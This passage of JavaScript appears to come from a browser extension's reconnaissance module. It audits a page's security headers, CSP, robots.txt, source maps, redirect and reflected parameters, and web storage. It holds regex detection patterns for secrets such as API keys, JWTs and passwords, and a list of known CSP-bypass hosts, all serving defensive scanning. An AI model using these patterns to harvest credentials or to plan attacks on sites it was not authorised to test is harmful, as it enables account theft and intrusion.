    else if (/unsafe-inline|unsafe-eval|\*/i.test(hdr('content-security-policy'))) add('med', 'Loose CSP', hdr('content-security-policy'));
    if (!hdr('x-frame-options') && !/frame-ancestors/i.test(hdr('content-security-policy'))) add('med', 'Clickjacking protection missing', 'No x-frame-options or CSP frame-ancestors directive found.');
    if (!hdr('x-content-type-options')) add('med', 'Missing nosniff', 'x-content-type-options: nosniff is absent.');
    if (!hdr('referrer-policy')) add('info', 'Missing Referrer-Policy', 'No referrer-policy header found.');
    if (!hdr('permissions-policy')) add('info', 'Missing Permissions-Policy', 'No permissions-policy header found.');
    if (hdr('access-control-allow-origin') === '*' && /true/i.test(hdr('access-control-allow-credentials'))) {
      add('high', 'Invalid credentialed wildcard CORS', 'access-control-allow-origin is * while credentials are enabled.');
    } else if (hdr('access-control-allow-origin')) {
      add('info', 'CORS header present', `access-control-allow-origin: ${hdr('access-control-allow-origin')}`);
    }
    if (hdr('server')) add('info', 'Server header exposed', hdr('server'));
    if (hdr('x-powered-by')) add('info', 'X-Powered-By exposed', hdr('x-powered-by'));

    const sev = findings.some(f => f.severity === 'high') ? 'high' : findings.some(f => f.severity === 'med') ? 'med' : 'info';
    let html = `<div class="recon-section" id="recon-sec-header-audit" data-severity="${sev}" data-section-name="Header Audit">
      <h4>Header Audit (${findings.length}) <button class="recon-rerun-btn" data-action="recon-rerun" data-check="headers" title="Re-run">Run</button><button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button><button class="recon-copy-btn" data-action="recon-copy" title="Copy">Copy</button></h4>`;
    html += `<div class="recon-item"><span class="tech-cat-label">Response</span><div class="tech-hdr-table">
      <div class="tech-hdr-row"><span class="tech-hdr-name">status</span><span class="tech-hdr-value">${esc(resp.status)} ${esc(resp.statusText || '')}</span></div>`;
    Object.entries(headers).sort(([a], [b]) => a.localeCompare(b)).forEach(([k, v]) => {
      html += `<div class="tech-hdr-row"><span class="tech-hdr-name">${esc(k)}</span><span class="tech-hdr-value">${esc(v)}</span></div>`;
    });
    html += `</div></div>`;
    if (!findings.length) {
      html += '<div class="recon-item muted">No common header issues detected</div>';
    } else {
      html += '<div class="recon-item"><span class="tech-cat-label">Findings</span>';
      findings.forEach(f => {
        html += `<div class="header-audit-row header-audit-${esc(f.severity)}">
          <span class="badge ${f.severity === 'high' ? 'danger' : f.severity === 'med' ? 'warn' : ''}">${esc(f.severity.toUpperCase())}</span>
          <b>${esc(f.name)}</b>
          <span class="muted">${esc(f.detail)}</span>
        </div>`;
      });
      html += '</div>';
    }
    html += '</div>';
    appendRecon(html);
  },

  async runAll() {
    this._runningAll = true;
    $('recon-output').innerHTML = '';
    const btn = $('recon-run-all');
    btn.disabled = true;
    btn.textContent = 'Running…';
    const scans = [
      () => this.techStack(),
      () => this.sourceScan(),
      () => this.sourceMaps(),
      () => this.links(),
      () => this.robotsAndSitemap(),
      () => this.openRedirects(),
      () => this.headerAudit(),
      () => this.cspAnalysis(),
      () => this.forms(),
      () => this.hiddenFields(),
      () => this.domXSS(),
      () => this.reflectedParams(),
      () => this.secrets(),
      () => this.storageScan(),
    ];
    for (const scan of scans) await scan().catch(() => {});
    this._runningAll = false;
    btn.disabled = false;
    btn.textContent = 'Run All';
  },

  async storageScan() {
    const [localRaw, sessionRaw] = await Promise.all([
      execPage(readStorageNamespace, ['localStorage']).catch(() => '{}'),
      execPage(readStorageNamespace, ['sessionStorage']).catch(() => '{}'),
    ]);

    let local, session;
    try { local   = JSON.parse(localRaw);   } catch { local   = {}; }
    try { session = JSON.parse(sessionRaw); } catch { session = {}; }

    const PATTERNS = [
      { name: 'JWT',               re: /eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g },
      { name: 'Bearer Token',      re: /Bearer\s+[A-Za-z0-9\-._~+/]+=*/g },
      { name: 'AWS Access Key',    re: /AKIA[0-9A-Z]{16}/g },
      { name: 'GitHub Token',      re: /ghp_[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9_]{82}/g },
      { name: 'Google API Key',    re: /AIza[0-9A-Za-z\-_]{35}/g },
      { name: 'Stripe Key',        re: /(?:pk|sk)_(?:test|live)_[0-9a-zA-Z]{24,}/g },
      { name: 'Slack Token',       re: /xox[baprs]-[0-9a-zA-Z]{10,}-[0-9a-zA-Z-]+/g },
      { name: 'Private Key',       re: /-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY/g },
      { name: 'NPM Token',         re: /npm_[A-Za-z0-9]{36}/g },
      { name: 'SendGrid Key',      re: /SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}/g },
      { name: 'MongoDB URI',       re: /mongodb(?:\+srv)?:\/\/[^:]+:[^@]+@[^\s"'<>]+/g },
      { name: 'Basic Auth in URL', re: /https?:\/\/[^:@\s"'<>]+:[^:@\s"'<>]+@[^\s"'<>]+/g },
      { name: 'Password',          re: /(?:password|passwd|pwd)\s*[:=]\s*["']?[^"'\s,;]{4,64}/gi },
      { name: 'API Key',           re: /api[_-]?key\s*[:=]\s*["']?[^"'\s,;]{8,64}/gi },
      { name: 'Secret / Token',    re: /(?<![a-z])(?:secret|token)\s*[:=]\s*["']?[^"'\s,;]{8,64}/gi },
      { name: 'Email Address',     re: /[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}/g },
      { name: 'Session ID',        re: /[a-f0-9]{32,}|[A-Za-z0-9+/]{40,}={0,2}/g },
    ];

    const SENSITIVE_KEYS = /token|auth|session|secret|password|passwd|pwd|credential|jwt|access|refresh|api.?key|user|email|phone|ssn|card|cvv/i;

    const findings = [];
    const seen = new Set();

    const sources = [
      { store: 'localStorage',   data: local   },
      { store: 'sessionStorage', data: session },
    ];

    sources.forEach(({ store, data }) => {
      Object.entries(data).forEach(([key, value]) => {
        const combined = `${key}=${value}`;

        // Flag sensitive-looking key names even without a pattern match
        if (SENSITIVE_KEYS.test(key)) {
          const seenKey = `Sensitive Key:${store}:${key}`;
          if (!seen.has(seenKey)) {
            seen.add(seenKey);
            findings.push({ pattern: 'Sensitive Key Name', match: String(value), key, store });
          }
        }

        // Run regex patterns against the full key=value string
        PATTERNS.forEach(({ name, re }) => {
          re.lastIndex = 0;
          let m;
          while ((m = re.exec(combined)) !== null) {
            const seenKey = `${name}:${m[0]}`;
            if (seen.has(seenKey)) continue;
            seen.add(seenKey);
            findings.push({ pattern: name, match: m[0], key, store });
            if (findings.length >= 300) return;
          }
        });
      });
    });

    const STORAGE_HIGH = new Set(['JWT','AWS Access Key','Private Key','GitHub Token','Stripe Key','Bearer Token','MongoDB URI','Basic Auth in URL','Password','NPM Token','SendGrid Key','Google API Key','Slack Token']);
    const storageSev = findings.some(f => STORAGE_HIGH.has(f.pattern)) ? 'high' : findings.length > 0 ? 'med' : 'info';
    let html = `<div class="recon-section" id="recon-sec-storage" data-severity="${storageSev}" data-section-name="Storage Scan"><h4>Storage Sensitive Data (${findings.length}) <button class="recon-rerun-btn" data-action="recon-rerun" data-check="storage" title="Re-run">Run</button><button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button><button class="recon-copy-btn" data-action="recon-copy" title="Copy">Copy</button></h4>`;

    const localCount   = Object.keys(local).length;
    const sessionCount = Object.keys(session).length;
    html += `<div class="recon-item muted" style="font-size:12px">Scanned ${localCount} localStorage + ${sessionCount} sessionStorage entries</div>`;

    if (!findings.length) {
      html += '<div class="recon-item muted">No sensitive data detected</div>';
    } else {
      const byPattern = {};
      findings.forEach(f => { (byPattern[f.pattern] ??= []).push(f); });
      Object.entries(byPattern).forEach(([pattern, items]) => {
        html += `<div class="recon-item"><span class="tech-cat-label">${esc(pattern)}</span>`;
        items.slice(0, 10).forEach(f => {
          html += `<div class="secrets-row">
            <span class="secrets-match" title="${esc(f.match)}">${esc(f.match)}</span>
            <span class="muted secrets-loc">${esc(f.store)} / ${esc(f.key)}</span>
            <button class="recon-copy-btn secrets-copy-btn" data-action="secrets-copy" data-val="${esc(f.match)}" title="Copy">Copy</button>
          </div>`;
        });
        if (items.length > 10) html += `<div class="muted" style="font-size:12px;margin-top:4px">+${items.length - 10} more</div>`;
        html += `</div>`;
      });
    }

    html += '</div>';
    appendRecon(html);
  },

  async robotsAndSitemap() {
    await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });
    let origin;
    try { origin = new URL(state.tabUrl).origin; } catch { return; }

    const robotsResp = await bg('FETCH', { url: `${origin}/robots.txt`, maxBody: 50000 }).catch(() => null);
    const robotsBody = robotsResp?.status === 200 ? robotsResp.body : null;

    const disallowed = [], sitemapRefs = [];
    const INTERESTING = /admin|backup|\.git|\.env|config|debug|dev|internal|private|secret|test|staging|upload|export|manage|console/i;

    if (robotsBody) {
      for (const line of robotsBody.split('\n')) {
        const trimmed = line.trim();
        if (!trimmed || trimmed.startsWith('#')) continue;
        const colon = trimmed.indexOf(':');
        if (colon === -1) continue;
        const key = trimmed.slice(0, colon).trim().toLowerCase();
        const val = trimmed.slice(colon + 1).trim();
        if (key === 'disallow' && val) disallowed.push(val);
        else if (key === 'sitemap' && val) sitemapRefs.push(val);
      }
    }

    const interesting = disallowed.filter(p => INTERESTING.test(p));

    const sitemapUrl = sitemapRefs[0] || `${origin}/sitemap.xml`;
    const sitemapResp = await bg('FETCH', { url: sitemapUrl, maxBody: 200000 }).catch(() => null);
    const sitemapFound = sitemapResp?.status === 200 && sitemapResp.body;
    const sitemapUrls = sitemapFound
      ? [...sitemapResp.body.matchAll(/<loc>\s*([^<]+)\s*<\/loc>/gi)].map(m => m[1].trim()).slice(0, 200)
      : [];

    const sev = interesting.length ? 'med' : 'info';
    let html = `<div class="recon-section" id="recon-sec-robots" data-severity="${sev}" data-section-name="robots.txt / Sitemap">
      <h4>robots.txt / Sitemap
        <button class="recon-rerun-btn" data-action="recon-rerun" data-check="robots" title="Re-run">Run</button>
        <button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button>
        <button class="recon-copy-btn" data-action="recon-copy" title="Copy">Copy</button>
      </h4>`;

    if (!robotsBody) {
      html += `<div class="recon-item muted">robots.txt not found (${robotsResp?.status ?? 'no response'})</div>`;
    } else {
      html += `<div class="recon-item"><span class="tech-cat-label">robots.txt — ${disallowed.length} Disallow entries</span>`;
      if (interesting.length) {
        html += `<div style="margin-top:6px">`;
        interesting.forEach(p => {
          html += `<div class="header-audit-row">
            <span class="badge danger">!</span><b>${esc(p)}</b>
          </div>`;
        });
        html += `</div>`;
      }
      const rest = disallowed.filter(p => !interesting.includes(p));
      if (rest.length) {
        html += `<div style="margin-top:6px"><span class="tech-cat-label">All Disallow</span>`;
        rest.slice(0, 60).forEach(p => { html += `<div class="muted" style="font-family:var(--mono);font-size:12px">${esc(p)}</div>`; });
        if (rest.length > 60) html += `<div class="muted" style="font-size:12px">+${rest.length - 60} more</div>`;
        html += `</div>`;
      }
      if (sitemapRefs.length) {
        html += `<div style="margin-top:6px"><span class="tech-cat-label">Sitemap refs in robots.txt</span>`;
        sitemapRefs.forEach(u => { html += `<div class="muted" style="font-family:var(--mono);font-size:12px">${esc(u)}</div>`; });
        html += `</div>`;
      }
      html += `</div>`;
    }

    if (sitemapFound && sitemapUrls.length) {
      html += `<div class="recon-item"><span class="tech-cat-label">Sitemap URLs (${sitemapUrls.length})</span>`;
      sitemapUrls.slice(0, 60).forEach(u => { html += `<div class="muted" style="font-family:var(--mono);font-size:12px;overflow-wrap:anywhere">${esc(u)}</div>`; });
      if (sitemapUrls.length > 60) html += `<div class="muted" style="font-size:12px">+${sitemapUrls.length - 60} more</div>`;
      html += `</div>`;
    } else if (!robotsBody || !sitemapFound) {
      html += `<div class="recon-item muted">sitemap.xml not found at ${esc(sitemapUrl)} (${sitemapResp?.status ?? 'no response'})</div>`;
    }

    html += '</div>';
    appendRecon(html);
  },

  async sourceMaps() {
    await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });
    toast('Checking for exposed source maps…', 'info');

    const scriptUrls = await execPage(() => {
      try {
        return JSON.stringify(Array.from(document.querySelectorAll('script[src]')).map(s => s.src).filter(Boolean));
      } catch { return '[]'; }
    }).catch(() => '[]');

    const srcs = [...new Set(JSON.parse(scriptUrls))].filter(u => isHttpUrl(u)).slice(0, 30);
    const findings = [];

    for (const src of srcs) {
      const resp = await bg('FETCH', { url: src, maxBody: 4000 }).catch(() => null);
      if (!resp?.body) continue;
      const mapCommentMatch = resp.body.match(/\/\/[#@]\s*sourceMappingURL=(\S+)/);
      if (mapCommentMatch) {
        const ref = mapCommentMatch[1];
        if (ref.startsWith('data:')) continue;
        let mapUrl = null;
        try { mapUrl = new URL(ref, src).href; } catch {}
        if (!mapUrl || !isHttpUrl(mapUrl)) continue;
        const mapResp = await bg('FETCH', { url: mapUrl, maxBody: 500 }).catch(() => null);
        findings.push({ src, mapUrl, exposed: mapResp?.status === 200, status: mapResp?.status ?? 'error' });
      } else {
        const mapUrl = src.split('?')[0] + '.map';
        const mapResp = await bg('FETCH', { url: mapUrl, maxBody: 500 }).catch(() => null);
        if (mapResp?.status === 200) findings.push({ src, mapUrl, exposed: true, status: 200 });
      }
    }

    const exposed = findings.filter(f => f.exposed);
    const sev = exposed.length ? 'high' : 'info';
    let html = `<div class="recon-section" id="recon-sec-sourcemaps" data-severity="${sev}" data-section-name="Source Maps">
      <h4>Source Maps (${exposed.length} exposed / ${srcs.length} checked)
        <button class="recon-rerun-btn" data-action="recon-rerun" data-check="sourcemaps" title="Re-run">Run</button>
        <button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button>
        <button class="recon-copy-btn" data-action="recon-copy" title="Copy">Copy</button>
      </h4>`;

    if (!srcs.length) {
      html += `<div class="recon-item muted">No external scripts found on this page</div>`;
    } else if (!exposed.length) {
      html += `<div class="recon-item muted">No exposed source maps found (${srcs.length} scripts checked)</div>`;
    } else {
      html += `<div class="recon-item"><span class="tech-cat-label">Exposed source maps</span>`;
      exposed.forEach(f => {
        html += `<div class="header-audit-row">
          <span class="badge danger">EXPOSED</span>
          <span class="muted" style="font-family:var(--mono);font-size:11px;overflow-wrap:anywhere;flex:1;min-width:0">${esc(f.mapUrl)}</span>
        </div>
        <div class="muted" style="font-size:11px;font-family:var(--mono);overflow-wrap:anywhere;padding:0 0 6px 0">from: ${esc(f.src)}</div>`;
      });
      html += `</div>`;
    }

    html += '</div>';
    appendRecon(html);
  },

  async openRedirects() {
    await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });

    const REDIRECT_PARAMS = /^(?:redirect|redirect_url|redirect_uri|return|return_to|returnUrl|returnTo|next|goto|target|dest|destination|url|forward|continue|callback|successUrl|failUrl|back|ref|r|to|go|redir|location)$/i;

    const domRaw = await execPage(() => {
      try {
        return JSON.stringify([
          ...Array.from(document.querySelectorAll('a[href]')).map(a => a.href),
          ...Array.from(document.querySelectorAll('form[action]')).map(f => f.action),
        ].filter(Boolean));
      } catch { return '[]'; }
    }).catch(() => '[]');

    const allUrls = [...new Set([state.tabUrl, ...JSON.parse(domRaw), ...(Recon.spiderCache?.records || []).map(r => r.url)])];
    const findings = [], seen = new Set();

    for (const urlStr of allUrls) {
      let parsed;
      try { parsed = new URL(urlStr); } catch { continue; }
      for (const [param, value] of parsed.searchParams) {
        if (!REDIRECT_PARAMS.test(param)) continue;
        const key = `${parsed.origin}${parsed.pathname}::${param}`;
        if (seen.has(key)) continue;
        seen.add(key);
        const looksLikeUrl = /^https?:\/\/|^\/\/|^\//.test(value);
        findings.push({ url: `${parsed.origin}${parsed.pathname}`, param, value, looksLikeUrl });
      }
    }

    const sev = findings.length ? 'med' : 'info';
    let html = `<div class="recon-section" id="recon-sec-openredirect" data-severity="${sev}" data-section-name="Open Redirect Params">
      <h4>Open Redirect Params (${findings.length})
        <button class="recon-rerun-btn" data-action="recon-rerun" data-check="openredirect" title="Re-run">Run</button>
        <button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button>
        <button class="recon-copy-btn" data-action="recon-copy" title="Copy">Copy</button>
      </h4>`;

    if (!findings.length) {
      html += `<div class="recon-item muted">No redirect-style parameters found in ${allUrls.length} URLs scanned</div>`;
    } else {
      html += `<div class="recon-item">`;
      findings.forEach(f => {
        html += `<div class="header-audit-row">
          <span class="badge ${f.looksLikeUrl ? 'danger' : 'warn'}">${f.looksLikeUrl ? 'URL value' : 'param'}</span>
          <b>${esc(f.param)}</b>
          <span class="muted">${esc(f.url)}</span>
        </div>
        <div class="muted" style="font-family:var(--mono);font-size:11px;padding:0 0 6px 2px">value: ${esc(f.value || '(empty)')}</div>`;
      });
      html += `</div>`;
    }
    html += '</div>';
    appendRecon(html);
  },

  async reflectedParams() {
    await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });
    const pageUrl = state.tabUrl;
    let parsed;
    try { parsed = new URL(pageUrl); } catch { return; }

    const params = [...parsed.searchParams.entries()].filter(([, v]) => v.length >= 3);
    const findings = [];

    if (params.length) {
      const resp = await bg('FETCH', { url: pageUrl, maxBody: 300000 }).catch(() => null);
      const body = resp?.body || '';

      for (const [name, value] of params) {
        const idx = body.indexOf(value);
        if (idx === -1) continue;
        const encoded = value.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
        const appearsEncoded = encoded !== value && body.includes(encoded);
        const snippet = body.slice(Math.max(0, idx - 50), idx + value.length + 50);
        const scriptOpenBefore = body.lastIndexOf('<script', idx);
        const scriptCloseBefore = body.lastIndexOf('</script>', idx);
        const inScript = scriptOpenBefore > scriptCloseBefore;
        const inAttr = /=["'][^"'<]*$/.test(body.slice(Math.max(0, idx - 200), idx));
        const risk = (inScript && !appearsEncoded) ? 'high' : !appearsEncoded ? 'med' : 'info';
        findings.push({ name, value, snippet, inScript, inAttr, appearsEncoded, risk });
      }
    }

    const sev = findings.some(f => f.risk === 'high') ? 'high' : findings.some(f => f.risk === 'med') ? 'med' : 'info';
    let html = `<div class="recon-section" id="recon-sec-reflected" data-severity="${sev}" data-section-name="Reflected Params">
      <h4>Reflected Params (${params.length} URL param${params.length !== 1 ? 's' : ''})
        <button class="recon-rerun-btn" data-action="recon-rerun" data-check="reflected" title="Re-run">Run</button>
        <button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button>
        <button class="recon-copy-btn" data-action="recon-copy" title="Copy">Copy</button>
      </h4>`;

    if (!params.length) {
      html += `<div class="recon-item muted">No URL parameters on this page to test</div>`;
    } else if (!findings.length) {
      html += `<div class="recon-item muted">No URL parameter values found reflected in page source</div>`;
    } else {
      html += `<div class="recon-item"><span class="tech-cat-label">Reflected parameters</span>`;
      findings.forEach(f => {
        const cls = f.risk === 'high' ? 'danger' : f.risk === 'med' ? 'warn' : '';
        const context = f.inScript ? 'in &lt;script&gt;' : f.inAttr ? 'in attribute' : 'in HTML';
        const encNote = f.appearsEncoded ? ' (also HTML-encoded)' : ' (raw only)';
        html += `<div class="header-audit-row">
          <span class="badge ${cls}">${esc(f.risk.toUpperCase())}</span>
          <b>${esc(f.name)}</b>
          <span class="muted">${context}${encNote}</span>
        </div>
        <pre class="code-block" style="margin:2px 0 8px">${esc(f.snippet)}</pre>`;
      });
      html += `</div>`;
    }
    html += '</div>';
    appendRecon(html);
  },

  async cspAnalysis() {
    await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });
    const resp = await bg('FETCH', { url: state.tabUrl, maxBody: 0 }).catch(() => null);
    const headers = resp?.headers || {};
    const hdr = k => headers[k] || headers[k.toLowerCase()] || '';
    const csp   = hdr('content-security-policy');
    const cspRO = hdr('content-security-policy-report-only');
    const activeCsp = csp || cspRO;
    const isReportOnly = !csp && !!cspRO;

    const findings = [], positives = [];

    if (!activeCsp) {
      findings.push({ sev: 'high', issue: 'No CSP', detail: 'content-security-policy absent — XSS has no policy-level mitigation' });
    } else {
      if (isReportOnly) findings.push({ sev: 'med', issue: 'CSP is report-only', detail: 'Policy is not enforced, only reported — provides zero XSS protection' });

      const directives = {};
      activeCsp.split(';').forEach(d => {
        const parts = d.trim().split(/\s+/);
        if (parts[0]) directives[parts[0].toLowerCase()] = parts.slice(1);
      });
      const eff = key => directives[key] || directives['default-src'] || [];
      const scriptSrc = eff('script-src');
      const scriptStr = scriptSrc.join(' ');
      const objSrc    = directives['object-src'];

      if (scriptStr.includes("'unsafe-inline'"))
        findings.push({ sev: 'high', issue: "script-src 'unsafe-inline'", detail: 'Allows inline <script> and event handlers — negates XSS protection' });
      if (scriptStr.includes("'unsafe-eval'"))
        findings.push({ sev: 'high', issue: "script-src 'unsafe-eval'", detail: "Permits eval(), new Function(), setTimeout(string)" });
      if (scriptStr.includes("'unsafe-hashes'"))
        findings.push({ sev: 'med', issue: "script-src 'unsafe-hashes'", detail: 'Allows inline event handlers matching listed hashes' });
      if (scriptSrc.includes('*'))
        findings.push({ sev: 'high', issue: 'script-src wildcard (*)', detail: 'Scripts loadable from any origin' });
      if (scriptStr.includes('data:'))
        findings.push({ sev: 'high', issue: "script-src allows data:", detail: 'data: URIs can carry executable scripts' });
      if (scriptStr.includes('http:'))
        findings.push({ sev: 'high', issue: "script-src allows http:", detail: 'Scripts loadable over unencrypted HTTP' });

      const BYPASS_HOSTS = [
        ['ajax.googleapis.com',       'JSONP endpoint — well-known CSP bypass'],
        ['www.google.com',            'JSONP via /complete/search — CSP bypass'],
        ['accounts.google.com',       'Known CSP bypass gadget host'],
        ['cdn.jsdelivr.net',          'Serves arbitrary npm packages — full bypass'],
        ['unpkg.com',                 'Serves arbitrary npm packages — full bypass'],
        ['ajax.microsoft.com',        'JSONP available — known bypass'],
        ['az416426.vo.msecnd.net',    'App Insights CDN — known script gadget host'],
      ];
      scriptSrc.forEach(src => {
        BYPASS_HOSTS.forEach(([host, detail]) => {
          if (src.includes(host)) findings.push({ sev: 'high', issue: `Bypass-prone host: ${src}`, detail });
        });
        if (src.startsWith('*.')) findings.push({ sev: 'med', issue: `Wildcard subdomain: ${src}`, detail: 'Any subdomain can serve scripts — may include attacker-controlled subdomains' });
      });

      if (!objSrc && !directives['default-src'])
        findings.push({ sev: 'med', issue: 'object-src not set', detail: 'Plugin execution (Flash, Java) not restricted' });
      else if (objSrc && (objSrc.includes('*') || !objSrc.includes("'none'")))
        findings.push({ sev: 'high', issue: "object-src missing 'none'", detail: 'Plugins allowed from broad origins' });

      if (!directives['base-uri'])
        findings.push({ sev: 'med', issue: 'base-uri not set', detail: 'Injected <base href> can hijack all relative URL resolution' });
      if (!directives['form-action'])
        findings.push({ sev: 'info', issue: 'form-action not set', detail: 'Form submissions not restricted to known origins' });

      if (scriptStr.includes("'nonce-"))  positives.push('Nonces in use');
      if (scriptStr.match(/'sha(256|384|512)-/)) positives.push('Hashes in use');
      if (directives['upgrade-insecure-requests']) positives.push('upgrade-insecure-requests set');
      if (directives['block-all-mixed-content'])   positives.push('block-all-mixed-content set');
      if ((objSrc || []).includes("'none'"))        positives.push("object-src 'none' — plugins blocked");
      if ((directives['base-uri'] || []).includes("'none'") || (directives['base-uri'] || []).includes("'self'"))
        positives.push('base-uri restricted');
    }

    const sev = findings.some(f => f.sev === 'high') ? 'high' : findings.some(f => f.sev === 'med') ? 'med' : 'info';
    let html = `<div class="recon-section" id="recon-sec-csp" data-severity="${sev}" data-section-name="CSP Analysis">
      <h4>CSP Analysis (${findings.length} finding${findings.length !== 1 ? 's' : ''})
        <button class="recon-rerun-btn" data-action="recon-rerun" data-check="csp" title="Re-run">Run</button>
        <button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button>
        <button class="recon-copy-btn" data-action="recon-copy" title="Copy">Copy</button>
      </h4>`;

    if (activeCsp) {
      html += `<div class="recon-item"><span class="tech-cat-label">${isReportOnly ? 'CSP (report-only — not enforced)' : 'Active CSP'}</span>
        <pre class="code-block" style="word-break:break-all;white-space:pre-wrap">${esc(activeCsp)}</pre>
      </div>`;
    }
    if (findings.length) {
      html += `<div class="recon-item"><span class="tech-cat-label">Findings</span>`;
      findings.forEach(f => {
        const cls = f.sev === 'high' ? 'danger' : f.sev === 'med' ? 'warn' : '';
        html += `<div class="header-audit-row">
          <span class="badge ${cls}">${esc(f.sev.toUpperCase())}</span>
          <b>${esc(f.issue)}</b>
          <span class="muted">${esc(f.detail)}</span>
        </div>`;
      });
      html += `</div>`;
    }
    if (positives.length) {
      html += `<div class="recon-item"><span class="tech-cat-label">Positive signals</span>`;
      positives.forEach(p => { html += `<div class="muted" style="font-size:12px;padding:2px 0">✓ ${esc(p)}</div>`; });
      html += `</div>`;
    }
    html += '</div>';
    appendRecon(html);
  },
};

const RECON_PLACEHOLDER_DEFS = [
  { id: 'recon-sec-tech',         check: 'tech',        label: 'Tech Stack' },
  { id: 'recon-sec-source',       check: 'source',      label: 'Source Scan' },
  { id: 'recon-sec-sourcemaps',   check: 'sourcemaps',  label: 'Source Maps' },
  { id: 'recon-sec-links',        check: 'links',       label: 'Discovered Links &amp; Assets' },
  { id: 'recon-sec-robots',       check: 'robots',      label: 'robots.txt / Sitemap' },
  { id: 'recon-sec-openredirect', check: 'openredirect',label: 'Open Redirect Params' },
  { id: 'recon-sec-header-audit', check: 'headers',     label: 'Header Audit' },
  { id: 'recon-sec-csp',          check: 'csp',         label: 'CSP Analysis' },
  { id: 'recon-sec-forms',        check: 'forms',       label: 'Forms' },
  { id: 'recon-sec-hidden',       check: 'hidden',      label: 'Hidden Fields' },
  { id: 'recon-sec-domxss',       check: 'domxss',      label: 'DOM XSS' },
  { id: 'recon-sec-reflected',    check: 'reflected',   label: 'Reflected Params' },
  { id: 'recon-sec-secrets',      check: 'secrets',     label: 'Secrets &amp; Sensitive Data' },
  { id: 'recon-sec-storage',      check: 'storage',     label: 'Storage Scan' },
];

function initReconPlaceholders() {
  const output = $('recon-output');
  for (const def of RECON_PLACEHOLDER_DEFS) {
    if (document.getElementById(def.id)) continue;
    const wrap = document.createElement('div');
    wrap.innerHTML = `<div class="recon-section recon-placeholder" id="${def.id}">
      <h4>${def.label}
        <button class="recon-rerun-btn" data-action="recon-rerun" data-check="${def.check}" title="Run">Run</button>
        <button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button>
      </h4>
      <div class="recon-placeholder-msg muted">Not run</div>
    </div>`;
    const el = wrap.firstElementChild;
    const newIdx = RECON_SECTION_ORDER.indexOf(def.id);
    const sections = Array.from(output.querySelectorAll(':scope > .recon-section[id]'));
    const ref = sections.find(s => RECON_SECTION_ORDER.indexOf(s.id) > newIdx);
    if (ref) output.insertBefore(el, ref);
    else output.appendChild(el);
  }
}

const RECON_SECTION_ORDER = [
  'recon-sec-tech', 'recon-sec-source', 'recon-sec-sourcemaps', 'recon-sec-links',
  'recon-sec-robots', 'recon-sec-openredirect', 'recon-sec-header-audit', 'recon-sec-csp',
  'recon-sec-forms', 'recon-sec-hidden', 'recon-sec-domxss', 'recon-sec-reflected',
  'recon-sec-secrets', 'recon-sec-storage',
];
const RECON_RERUN_MAP = {
  tech:         () => Recon.techStack(),
  source:       () => Recon.sourceScan(),
  sourcemaps:   () => Recon.sourceMaps(),
  links:        () => Recon.links(),
  robots:       () => Recon.robotsAndSitemap(),
  openredirect: () => Recon.openRedirects(),
  headers:      () => Recon.headerAudit(),
  csp:          () => Recon.cspAnalysis(),
  forms:        () => Recon.forms(),
  hidden:       () => Recon.hiddenFields(),
  domxss:       () => Recon.domXSS(),
  reflected:    () => Recon.reflectedParams(),
  secrets:      () => Recon.secrets(),
  storage:      () => Recon.storageScan(),
};

function appendRecon(html) {
  const output = $('recon-output');
  const wrap = document.createElement('div');
  wrap.innerHTML = html.trim();
  const newSection = wrap.firstElementChild;
  if (!newSection) return;
  const newId = newSection.id;

  const existing = newId ? document.getElementById(newId) : null;
  if (existing) {
    existing.replaceWith(newSection);
  } else {
    const newIdx = RECON_SECTION_ORDER.indexOf(newId);
    const sections = Array.from(output.querySelectorAll(':scope > .recon-section[id]'));
    const ref = sections.find(s => RECON_SECTION_ORDER.indexOf(s.id) > newIdx);
    if (ref) output.insertBefore(newSection, ref);
    else output.appendChild(newSection);
  }

  renderSummaryBar();
  if (!Recon._runningAll) scrollContentToElement(newSection);
}

function scrollContentToElement(el, extraOffset = 8) {
  const content = $('content');
  if (!content || !el) return;
  const activeBar = $('active-bar');
  const stickyHeight = activeBar ? activeBar.offsetHeight : 0;
  const contentTop = content.getBoundingClientRect().top;
  const targetTop = el.getBoundingClientRect().top;
  content.scrollTo({
    top: content.scrollTop + targetTop - contentTop - stickyHeight - extraOffset,
    behavior: 'smooth',
  });
}

function renderSummaryBar() {
  document.getElementById('recon-summary-bar')?.remove();
  const sections = Array.from($$('.recon-section[data-severity]'));
  if (!sections.length) return;

  const highs = [], meds = [], infos = [];
  sections.forEach(s => {
    const entry = { name: s.dataset.sectionName || s.id, id: s.id };
    if      (s.dataset.severity === 'high') highs.push(entry);
    else if (s.dataset.severity === 'med')  meds.push(entry);
    else                                    infos.push(entry);
  });

  let bar = `<div id="recon-summary-bar" class="recon-summary-bar"><span class="sum-label">Summary</span>`;
  if (highs.length) {
    bar += `<span class="sum-badge sum-high">HIGH</span>`;
    highs.forEach(h => bar += `<a class="sum-link" data-scroll-to="${h.id}">${esc(h.name)}</a>`);
  }
  if (meds.length) {
    bar += `<span class="sum-badge sum-med">MED</span>`;
    meds.forEach(m => bar += `<a class="sum-link" data-scroll-to="${m.id}">${esc(m.name)}</a>`);
  }
  if (infos.length) {
    bar += `<span class="sum-badge sum-info">INFO</span>`;
    infos.forEach(i => bar += `<a class="sum-link" data-scroll-to="${i.id}">${esc(i.name)}</a>`);
  }
  bar += `</div>`;
